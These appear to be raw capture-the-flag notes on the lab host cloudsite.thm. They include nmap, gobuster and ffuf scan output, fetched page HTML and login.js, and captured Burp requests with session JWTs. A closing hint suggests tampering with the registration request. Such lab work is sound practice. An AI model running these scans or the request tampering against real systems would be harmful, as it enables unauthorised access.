10.81.191.221 // 10.81.120.175

nmap -sC -sV 10.81.191.221
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-22 10:27 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.81.191.221
Host is up (0.000080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds

/etc/hosts
10.81.191.221 -> cloudsite.thm

gobuster dir -u http://cloudsite.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cloudsite.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://cloudsite.thm/assets/]
/server-status        (Status: 403) [Size: 278]
Progress: 218275 / 218276 (100.00%)
===============================================================

/assets 
/assets/css
/assets/font
/assets/fonts
/assets/images
/assets/js
/assets/plugins
/assets/scss
/assets/webfonts

Bootstrap
jQuery 3.2.1
Popper.js
FontAwesome

curl http://cloudsite.thm
<!doctype html>
<html lang="eng">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title></title>
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/fontawsom-all.min.css">
    <link rel="stylesheet" href="assets/plugins/testimonial/css/owl.carousel.min.css">
    <link rel="stylesheet" href="assets/plugins/testimonial/css/owl.theme.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>

<body>
    <!-- ***************************** Head Starts Here *********************************-->
    <div class="head-cover">
         <header id="menu-jk" class="container-fluid">
            <div class="container">
                <div class="row head-ro">
                    <div class="col-md-3 logo">
                        <img src="assets/images/logo.png" alt="">
                          

                                 <a class="d-md-none small-menu" data-bs-toggle="collapse" href="#collapseExample" role="button" aria-expanded="false" aria-controls="collapseExample">

                                <i class="fas d-lg-none  fa-bars"></i>
                           </a>
                    </div>
                    <div id="collapseExample" class="col-md-9  nav">
                        <ul>
                            <li><a href="/">Home</a></li>
                            <li><a href="about_us.html">About Us</a></li>
                            <li><a href="services.html">Services</a></li>
                            <li><a href="blog.html">Blog</a></li>
                            <li><a href="contact_us.html">Contact Us</a></li>
                            <li class="btnll"><button class="btn btn-sm btn-primary" onclick="window.location.href='http://storage.cloudsite.thm/'">Login / Sign Up</button></li>
                        </ul>
                    </div>
                </div>
            </div>

        </header>
    </div>
   
    <!-- ***************************** Banner Starts Here *********************************-->
    <section class="container-fluid banner-container">
        <div class="container">
            <div class="row banner-row">
                <div class="col-md-6 banner-txt">
                    <h1>We Provide Best and Very Secure Cloud Services</h1>
                    <p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout.
                    The point of using Lorem Ipsum is that it has.</p>
                      <p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout.
                    The point of using Lorem Ipsum is that it has.</p>
                    <div class="btn-row row">
                       <button class="btn btn-primary">Read More</button>
                       <button class="btn btn-outline-primary" onclick="window.location.href='http://storage.cloudsite.thm/register.html'">Create Account</button>
                   </div>
               </div>
               <div class="col-md-6 banner-img">
                    <img src="assets/images/slider.png" alt="">
               </div>
           </div>
       </div>
   </section>
   <!-- ***************************** Key Features Starts Here *********************************-->
   <div class="container-fluid key-featurecont">
       <div class="container">
           <div class="row key-ro">
               <div class="col-md-4 keycol">
                   <div class="key-cover">
                       <div class="logo-cc">
                           <img src="assets/images/data-transfer.svg" alt="">
                       </div>
                       <div class="text-cc">
                        <h3>High Data Security</h3>
                        <p>It is a long established fact that a reader will be distracted by the.</p>
                    </div>
                </div>
            </div>
            <div class="col-md-4 keycol">
               <div class="key-cover">
                   <div class="logo-cc">
                       <img src="assets/images/cloud-network.svg" alt="">
                   </div>
                   <div class="text-cc">
                    <h3>Multiple Data Centers</h3>
                    <p>It is a long established fact that a reader will be distracted by the.</p>
                </div>
            </div>
        </div>
        <div class="col-md-4 keycol">
           <div class="key-cover">
               <div class="logo-cc">
                   <img src="assets/images/support.svg" alt="">
               </div>
               <div class="text-cc">
                <h3>24 x 7 Support</h3>
                <p>It is a long established fact that a reader will be distracted by the.</p>
            </div>
        </div>
    </div>
</div>
</div>
</div>

<!-- ***************************** About us Starts Here *********************************-->

<section class="container-fluid about-coo">
  <div class="container">
    <div class="row section-title">
        <h2>About Us</h2>
        <p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has.</p>
    </div>
      <div class="row about-row">
          <div class="col-md-5 about-img">
              <img src="assets/images/about.png" alt="">
          </div>
          <div class="col-md-6 about-text">
              <h1>We are the Leading Cloud Service Provider</h1>
              <p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has.</p>
              <div class="about-featur">
                  <ul>
                      <li><i class="fa fa-check"></i> Boost SEO Sharing</li>
                      <li><i class="fa fa-check"></i> Social Sharing</li>
                      <li><i class="fa fa-check"></i> Marketing</li>
                      <li><i class="fa fa-check"></i> Retention</li>
                      <li><i class="fa fa-check"></i> Visual Review</li>
                      <li><i class="fa fa-check"></i> Review Generation</li>

                  </ul>
              </div>
          </div>
      </div>
  </div>
</section>

<!--*************** Features Starts Here ***************-->
    <section id="features" class="features container-fluid">
        <div class="container">
           <div class="row section-title">
               <h2>Our Services</h2>
               <p>There are many variations of passages of Lorem Ipsum available, but the majority have suffered</p>
           </div>
            <div class="row mt-5 feature-row">
                <div class="col-md-4">
                    <div class="feature-col">
                       <img src="assets/images/services/s1.png" alt="">
                        <h4>Fully Transparent</h4>
                        <p>Accurate information of work. Visualization achieved through the board.</p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="feature-col">
                       <img src="assets/images/services/s2.png" alt="">
                        <h4>Continuous Improvement</h4>
                        <p>Accurate information of work. Visualization achieved through the board.</p>
                    </div>
                </div>

                <div class="col-md-4">
                    <div class="feature-col">
                        <img src="assets/images/services/s3.png" alt="">
                        <h4>Fully Responsive</h4>
                        <p>Accurate information of work. Visualization achieved through the board.</p>
                    </div>
                </div>

                <div class="col-md-4">
                    <div class="feature-col">
                        <img src="assets/images/services/s4.png" alt="">
                        <h4>Cloud Based</h4>
                        <p>Accurate information of work. Visualization achieved through the board.</p>
                    </div>
                </div>

                <div class="col-md-4">
                    <div class="feature-col">
                       <img src="assets/images/services/s5.png" alt="">
                        <h4>Easy to Use</h4>
                        <p>Accurate information of work. Visualization achieved through the board.</p>
                    </div>
                </div>

                <div class="col-md-4">
                    <div class="feature-col">
                       <img src="assets/images/services/s6.png" alt="">
                        <h4>24 x 7 Support</h4>
                        <p>Accurate information of work. Visualization achieved through the board.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>


    <!--  ************************* Blog Starts Here ************************** -->
    <div class="blog">

        <div class="container">
              <div class="section-title row">
               <h2>Our Blog</h2>
                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
            </div>
           
            <div class="row mt-5 blog-row">
                <div class="col-md-6 col-sm-12">
                    <div class="blog-singe no-margin row">
                        <div class="col-sm-5 blog-img-tab">
                            <img src="assets/images/blog/b1.png" alt="">
                        </div>
                        <div class="col-sm-7 blog-content-tab">
                            <h2>Curabit finibus dui sem.</h2>
                            <p><i class="fas fa-user"><small>Admin</small></i>  <i class="fas fa-eye"><small>(12)</small></i>  <i class="fas fa-comments"><small>(12)</small></i></p>
                            <p class="blog-desic">Lorem Ipsum, type lorem then press the shortcut. The default keyboard shortcut is the same keyboard shortcut is the </p>
                            <a href="blog_single.html">Read More <i class="fas fa-arrow-right"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-md-6 col-sm-12">
                    <div class="blog-singe no-margin row">
                        <div class="col-sm-5 blog-img-tab">
                            <img src="assets/images/blog/b2.png" alt="">
                        </div>
                        <div class="col-sm-7 blog-content-tab">
                            <h2>Excepteur sint occaecat</h2>
                            <p><i class="fas fa-user"><small>Admin</small></i>  <i class="fas fa-eye"><small>(12)</small></i>  <i class="fas fa-comments"><small>(12)</small></i></p>
                            <p class="blog-desic">Lorem Ipsum, type lorem then press the shortcut. The default keyboard shortcut is the same keyboard shortcut is the </p>
                            <a href="blog_single.html">Read More <i class="fas fa-arrow-right"></i></a>
                        </div>
                    </div>
                </div>


            </div>
        </div>
    </div>




<!-- ################# Testimonial Starts Here#######################--->
<section class="testimonial-container">
    <div class="container">
     <div class="section-title row">
        <h2>Testimonial</h2>
        <p>Take a look at what people say about us</p>
    </div>
    <div class="row mt-5">
        <div class="col-md-offset-2 float-auto col-md-10">
            <div id="testimonial-slider" class="owl-carousel">
                <div class="testimonial">
                    <div class="pic">
                        <img src="assets/images/testimonial/member-01.jpg" alt="">
                    </div>
                    <p class="description">
                        Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda deleniti dolor ipsum molestias mollitia ut. Aliquam aperiam corporis cumque debitis delectus dignissimos. Lorem ipsum dolor sit amet, consectetur.
                    </p>
                    <h3 class="title">williamson
                        <span class="post"> -  Developer</span>
                    </h3>
                </div>

                <div class="testimonial">
                    <div class="pic">
                        <img src="assets/images/testimonial/member-02.jpg" alt="">
                    </div>
                    <p class="description">
                        Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda deleniti dolor ipsum molestias mollitia ut. Aliquam aperiam corporis cumque debitis delectus dignissimos. Lorem ipsum dolor sit amet, consectetur.
                    </p>
                    <h3 class="title">Kristina
                        <span class="post"> - Teacher</span>
                    </h3>
                </div>


                <div class="testimonial">
                    <div class="pic">
                        <img src="assets/images/testimonial/member-02.jpg" alt="">
                    </div>
                    <p class="description">
                        Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda deleniti dolor ipsum molestias mollitia ut. Aliquam aperiam corporis cumque debitis delectus dignissimos. Lorem ipsum dolor sit amet, consectetur.
                    </p>
                    <h3 class="title">Kristina
                        <span class="post"> - Teacher</span>
                    </h3>
                </div>
            </div>
        </div>
    </div>
</div>
</section>




<!--********************************* Footer Starts Here ********************************************-->


<div class="footer-ablove">
    <div class="container">
        <div class="row">
            <p>Are you looking for a consultant for your Business
                <button class="btn btn-default">Get Quote</button>
            </p>
        </div>
    </div>
</div>

<footer>
    <div class="container">
        <div class="row">
            <div class="col-md-3 about">
                <h2>About Us</h2>
                <p>Phasellus scelerisque ornare nisl sit amet pulvinar. Nunc non scelerisque augue. Proin et sollicitudin velit. </p>
                
                <div class="foot-address">
                    <div class="icon">
                        <i class="fas fa-map-marker-alt"></i>
                    </div>
                    <div class="addet">
                        BlueDart
                        Marthandam (K.K District)
                        Tamil Nadu, IND 
                    </div>
                </div>
                <div class="foot-address">
                    <div class="icon">
                        <i class="far fa-envelope-open"></i>
                    </div>
                    <div class="addet">
                        info@smarteyeapps.com <br>
                        sales@smarteyeapps.com
                    </div>
                </div>
                <div class="foot-address">
                    <div class="icon">
                       <i class="fas fa-mobile-alt"></i>
                   </div>
                   <div class="addet">
                    +23 323 43434 <br>
                    +1 3232 434 55
                </div>
            </div>
        </div>
        <div class="col-md-3 fotblog">
            <h2>From latest Blog</h2>
            <div class="blohjb">
                <p>dignissim. Integer tempor facilisis malesuada. Proin ac varius velit, tincidunt condimentum</p>
                <span>22-1-2019</span>
            </div>
            <div class="blohjb">
                <p>dignissim. Integer tempor facilisis malesuada. Proin ac varius velit, tincidunt condimentum</p>
                <span>22-1-2019</span>
            </div>
            <div class="blohjb">
                <p>dignissim. Integer tempor facilisis malesuada. Proin ac varius velit, tincidunt condimentum</p>
                <span>22-1-2019</span>
            </div>
        </div>
        <div class="col-md-3 glink">
            <ul>
                <li><a href="/"><i class="fas fa-angle-double-right"></i>Home</a></li>
                <li><a href="about_us.html"><i class="fas fa-angle-double-right"></i>About Us</a></li>
                <li><a href="services.html"><i class="fas fa-angle-double-right"></i>Services</a></li>
                <li><a href="blog.html"><i class="fas fa-angle-double-right"></i>Blog</a></li>
                <li><a href="contact_us.html"><i class="fas fa-angle-double-right"></i>Contact Us</a></li>
            </ul>
        </div>
        <div class="col-md-3 tags">
            <h2>Easy Tags</h2>
            <ul>
                <li>Finance</li>
                <li>Web Design</li>
                <li>Internet Pro</li>
                <li>Node Js</li>
                <li>Java Swing</li>
                <li>Angular Js</li>
                <li>Vue Js</li>
            </ul>
        </div>
    </div>
</div>
</footer>
<div class="copy">
    <div class="container">
        <a href="https://www.smarteyeapps.com/">2015 &copy; All Rights Reserved | Designed and Developed by Smarteyeapps</a>
        <span>
            <a><i class="fab fa-github"></i></a>
            <a><i class="fab fa-google-plus-g"></i></a>
            <a><i class="fab fa-pinterest-p"></i></a>
            <a><i class="fab fa-twitter"></i></a>
            <a><i class="fab fa-facebook-f"></i></a>
        </span>
    </div>
</div>



</body>

<script src="assets/js/jquery-3.2.1.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/plugins/testimonial/js/owl.carousel.min.js"></script>
<script src="assets/plugins/scroll-fixed/jquery-scrolltofixed-min.js"></script>
<script src="assets/js/script.js"></script>
</html>

subdomians 
http://storage.cloudsite.thm/
http://storage.cloudsite.thm/register.html

/etc/hosts
10.81.191.221 storage.cloudsite.thmn

/asstes/js/login.js

document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();
    
    // Clear any previous errors
    const errorDiv = document.querySelector(".loginError");
    errorDiv.innerHTML = "";
    
    const formData = {
        email: this.elements.email.value,
        password: this.elements.password.value
    };

    try {
        const response = await axios.post("/api/login", formData, {
            headers: {
                "Content-Type": "application/json"
            }
        });
        
        console.log(response.data);
        if(response.data === "inactive"){
            window.location.replace("/dashboard/inactive");
        }
        else if (response.data === "active"){
            window.location.replace("/dashboard/active");
        }
        this.reset();
    } catch (error) {
        // Add error message to the loginError div
        errorDiv.innerHTML = `<div class="alert alert-danger">Invalid Username or Password</div>`;
    }
});

/active -> {"message":"Token not provided"}
/inactive -> {"message":"Token not provided"}

POST /api/login HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 43
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Referer: http://storage.cloudsite.thm/
Priority: u=0

{"email":"tets@thm.de","password":"123456"}

POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/register.html
Content-Type: application/json
Content-Length: 43
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Priority: u=0

{"email":"test@thm.de","password":"123456"}

GET /dashboard/inactive HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://storage.cloudsite.thm/
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmRlIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NzE3NTc1NzksImV4cCI6MTc3MTc2MTE3OX0.CY5CXqyNiLTBi3fRRseUG9ez-jgKSxAs34p2CanJxV0
Upgrade-Insecure-Requests: 1
Priority: u=0, i


yJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmRlIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NzE3NTc1NzksImV4cCI6MTc3MTc2MTE3OX0.CY5CXqyNiLTBi3fRRseUG9ez-jgKSxAs34p2CanJxV0

"Invalid token"

GET /dashboard/inactive HTTP/1.1 
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://storage.cloudsite.thm/
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmRlIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NzE3NTc4NjYsImV4cCI6MTc3MTc2MTQ2Nn0.qmmNgSu-742d08BBx7NvLniq9kcf09G5WJ-yBe_367Q
Upgrade-Insecure-Requests: 1
If-Modified-Since: Thu, 15 Aug 2024 16:29:07 GMT
If-None-Match: W/"1da2-19156df18f8-gzip"
Priority: u=0, i

POST /api/logout HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/inactive
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmRlIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NzE3NTc4NjYsImV4cCI6MTc3MTc2MTQ2Nn0.qmmNgSu-742d08BBx7NvLniq9kcf09G5WJ-yBe_367Q
Priority: u=0
Content-Length: 0

ffuf -u http://storage.cloudsite.thm/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/endpoints.txt -fc 404

ffuf -u http://storage.cloudsite.thm/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,401,403,500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401,403,500
________________________________________________

:: Progress: [40/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errdocs                    [Status: 403, Size: 27, Words: 2, Lines: 1]
:: Progress: [126/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [127/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Eruploads                 [Status: 401, Size: 32, Words: 3, Lines: 1]
:: Progress: [200/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [247/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [371/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [507/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [667/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [813/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [972/218275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [1139/218275] :: Job [1/1] :: 1383 req/sec :: Duration: [0:00:01] ::: Progress: [1287/218275] :: Job [1/1] :: 1078 req/sec :: Duration: [0:00:01] ::: Progress: [1447/218275] :: Job [1/1] :: 1158 req/sec :: Duration: [0:00:01] ::: Progress: [1559/218275] :: Job [1/1] :: 836 req/sec :: Duration: [0:00:01] :::: Progress: [1723/218275] :: Job [1/1] :: 1605 req/sec :: Duration: [0:00:01] ::: Progress: [1849/218275] :: Job [1/1] :: 1056 req/sec :: Duration: [0:00:01] ::: Progress: [2019/218275] :: Job [1/1] :: 1678 req/sec :: Duration: [0:00:01] ::: Progress: [2189/218275] :: Job [1/1] :: 1365 req/sec :: Duration: [0:00:01] ::: Progress: [2339/218275] :: Job [1/1] :: 1168 req/sec :: Duration: [0:00:02] :Docs                    [Status: 403, Size: 27, Words: 2, Lines: 1]
:: Progress: [2397/218275] :: Job [1/1] :: 1231 req/sec :: Duration: [0:00:02] ::: Progress: [2529/218275] :: Job [1/1] :: 1692 req/sec :: Duration: [0:00:02] ::: Progress: [2712/218275] :: Job [1/1] :: 1297 req/sec :: Duration: [0:00:02] ::: Progress: [2881/218275] :: Job [1/1] :: 1486 req/sec :: Duration: [0:00:02] ::: Progress: [3091/218275] :: Job [1/1] :: 1705 req/sec :: Duration: [0:00:02] ::: Progress: [3292/218275] :: Job [1/1] :: 1855 req/sec :: Duration: [0:00:02] ::: Progress: [3503/218275] :: Job [1/1] :: 1760 req/sec :: Duration: [0:00:02] ::: Progress: [3736/218275] :: Job [1/1] :: 2167 req/sec :: Duration: [0:00:02] ::: Progress: [3926/218275] :: Job [1/1] :: 1696 req/sec :: Duration: [0:00:03] ::: Progress: [4114/218275] :: Job [1/1] :: 1215 req/sec :: Duration: [0:00:03] ::: Progress: [4335/218275] :: Job [1/1] :: 1659 req/sec :: Duration: [0:00:03] ::: Progress: [4541/218275] :: Job [1/1] :: 1700 req/sec :: Duration: [0:00:03] ::: Progress: [4755/218275] :: Job [1/1] :: 1824 req/sec :: Duration: [0:00:03] ::: Progress: [4986/218275] :: Job [1/1] :: 1925 req/sec :: Duration: [0:00:03] ::: Progress: [5186/218275] :: Job [1/1] :: 1829 req/sec :: Duration: [0:00:03] ::: Progress: [5394/218275] :: Job [1/1] :: 1551 req/sec :: Duration: [0:00:03] ::: Progress: [5626/218275] :: Job [1/1] :: 1890 req/sec :: Duration: [0:00:04] ::: Progress: [5826/218275] :: Job [1/1] :: 1827 req/sec :: Duration: [0:00:04] ::: Progress: [6059/218275] :: Job [1/1] :: 1965 req/sec :: Duration: [0:00:04] ::: Progress: [6262/218275] :: Job [1/1] :: 1215 req/sec :: Duration: [0:00:04] ::: Progress: [6493/218275] :: Job [1/1] :: 1991 req/sec :: Duration: [0:00:04] ::: Progress: [6719/218275] :: Job [1/1] :: 1974 req/sec :: Duration: [0:00:04] ::: Progress: [6961/218275] :: Job [1/1] :: 2036 req/sec :: Duration: [0:00:04] ::: Progress: [7199/218275] :: Job [1/1] :: 2063 req/sec :: Duration: [0:00:04] ::: Progress: [7424/218275] :: Job [1/1] :: 1970 req/sec :: Duration: [0:00:05] ::: Progress: [7656/218275] :: Job [1/1] :: 2017 req/sec :: Duration: [0:00:05] ::: Progress: [7902/218275] :: Job [1/1] :: 2074 req/sec :: Duration: [0:00:05] ::: Progress: [8142/218275] :: Job [1/1] :: 1897 req/sec :: Duration: [0:00:05] ::: Progress: [8379/218275] :: Job [1/1] :: 2034 req/sec :: Duration: [0:00:05] ::: Progress: [8620/218275] :: Job [1/1] :: 2038 req/sec :: Duration: [0:00:05] ::: Progress: [8759/218275] :: Job [1/1] :: 1995 req/sec :: Duration: [0:00:05] ::: Progress: [9017/218275] :: Job [1/1] :: 1509 req/sec :: Duration: [0:00:05] ::: Progress: [9261/218275] :: Job [1/1] :: 2072 req/sec :: Duration: [0:00:06] ::: Progress: [9496/218275] :: Job [1/1] :: 1564 req/sec :: Duration: [0:00:06] ::: Progress: [9747/218275] :: Job [1/1] :: 1984 req/sec :: Duration: [0:00:06] ::: Progress: [9947/218275] :: Job [1/1] :: 1929 req/sec :: Duration: [0:00:06] ::: Progress: [10180/218275] :: Job [1/1] :: 1793 req/sec :: Duration: [0:00:06] :: Progress: [10404/218275] :: Job [1/1] :: 1729 req/sec :: Duration: [0:00:06] :: Progress: [10654/218275] :: Job [1/1] :: 1868 req/sec :: Duration: [0:00:06] :: Progress: [10881/218275] :: Job [1/1] :: 2013 req/sec :: Duration: [0:00:06] :: Progress: [11085/218275] :: Job [1/1] :: 1284 req/sec :: Duration: [0:00:07] Uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1]
:: Progress: [11197/218275] :: Job [1/1] :: 1880 req/sec :: Duration: [0:00:07] :: Progress: [11312/218275] :: Job [1/1] :: 2028 req/sec :: Duration: [0:00:07] :: Progress: [11555/218275] :: Job [1/1] :: 2008 req/sec :: Duration: [0:00:07] :: Progress: [11796/218275] :: Job [1/1] :: 1993 req/sec :: Duration: [0:00:07] :: Progress: [12021/218275] :: Job [1/1] :: 1798 req/sec :: Duration: [0:00:07] :: Progress: [12259/218275] :: Job [1/1] :: 1808 req/sec :: Duration: [0:00:07] :: Progress: [12469/218275] :: Job [1/1] :: 1864 req/sec :: Duration: [0:00:07] :: Progress: [12693/218275] :: Job [1/1] :: 1813 req/sec :: Duration: [0:00:07] :: Progress: [12933/218275] :: Job [1/1] :: 1996 req/sec :: Duration: [0:0:: Progress: [13419/218275] :: Job [:: Progress: [13611/218275] :::: Progress: [15765/218275] :: Job [1/1] :: 2043 req/sec :: Duration: [0:00:09] :: Errors: 0 :::: Progress: [15972/218275] :: Job [1/1] :: 1850 req/sec :: Duration::: Progress: [16219/218275] :: Job [1/1] :: 1964 req/sec :: Duration: [0:DOCS                    [Status: 403, Size: 27, Words: 2, Lines: 1]
:: Progress: [36768/218275] :: Job [1/1] :: 1839 req/sec :: Duration: [0:00:20] :: Errors:: Progress: [37003/218275] :: Job [1/1] :: 1988 req/sec :: Duration: [0:00:21]:: Progress: [37239/218275] :: Job [1/1] :: 2014 req/sec :: Duration: [0:00:21:: Progress: [37492/218275] :: Job [1/1] :: 2084 req/sec :: Duration: [0:0:: Progress: [37692/218275] :: Job [1/1] :: 1823 req/sec :: Duration: :: Progress: [37927/218275] :: Job [1/1] :: 1655:: Progress: [38167/218275] :: Job [1/1] :: 1829 req/sec :::: Progress: [38403/218275] :: Job [1/1] :: 155:: Progress: [38646/218275] :: Job [1/1] :: Progress: [38856/218275] :: Job [1/1] :: 1985 req/sec :: Duration: [0:00:22] :: Err:: Progress: [39088/218275] :: Job [1/1] :: 1699 :: Progress: [39296/218275] :: Job [1/1] :: 1670 req/sec :: :: Progress: [39545/218275] :: Job [1/1] :: 2004 req/sec :: Duration: [0:00:22] :: Errors::: Progress: [39785/218275] :: Job [1/1] :: 2011 req/sec :: Durat:: Progress: [40017/218275] :: Job [1/1] :: 1399 req/:: Progress: [40253/218275] :: Job [1/1] :: 1975 req/sec :: Duration: [0:00:22] :: Errors::: Progress: [40485/218275] :: Job [1/1] :: 1695 req/sec :: Duration: [0:: Progress: [40694/218275] :: Job [1/1] :: 1910 req/sec :: Duration: [0:00:23] :::: Progress: [40934/218275] :: Job [1/1] :: 1996 req/sec ::: Progress: [41176/218275] :: Job [1/1] :: 2017 req/sec :: Duration: [0:00:23] :: Err:: Progress: [41375/218275] :: Job [1/1] :: 1833 req/sec :: Duration: [0:00:23] :: Err:: Progress: [41620/218275] :: Job [1/1] :: 1917 req/sec :: Duration: [0:00:23] :: Err:: Progress: [41858/218275] :: Job [1/1] :: 1884 req/sec :: Duration: [0:00:23] :: Err:: Progress: [42098/218275] :: Job [1/1] :: 2013 req/sec :: Duration: [0:00:23] :: Err:: Progress: [42342/218275] :: Job [1/1] :: 2040 req/sec :: Duration: [0:00:23] :: E:: Progress: [42543/218275] :: Job [1/1] :: 1869 req/sec :: Duration: [0:00:24] :: Err:: Progress: [42784/218275] :: Job [1/1] :: 2322 req/sec :: Duration: [0:00:24] :::: Progress: [43025/218275] :: Job [1/1] :: 2045 req/sec :: Duration: [0:00:24] :: Progress: [43257/218275] :: Progress: [43501/:: Progress: [43710/218275] :: Job [1/1] :: 1559 r:: Progress: [43958/21827:: Progress: [44196/218275] :: Job [1/1] :: 1745 r:: Progress: [44438/218275] :: :: Progress: [44676/218275] :: Job [1/1] :: 2086 req/sec :: Duration: [0:: Progress: [218275/218275] :: Job [1/1] :: 2102 req/sec :: Duration: [0:02:01] :: Errors: 0 ::

uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1]
Uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1]

chnage register in burp

<!DOCTYPE html>
<html lang="eng">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <title></title>
    <link rel="stylesheet" href="/assets/css/bootstrap.min.css" />
    <link rel="stylesheet" href="/assets/css/fontawsom-all.min.css" />
    <link
      rel="stylesheet"
      href="/assets/plugins/testimonial/css/owl.carousel.min.css"
    />
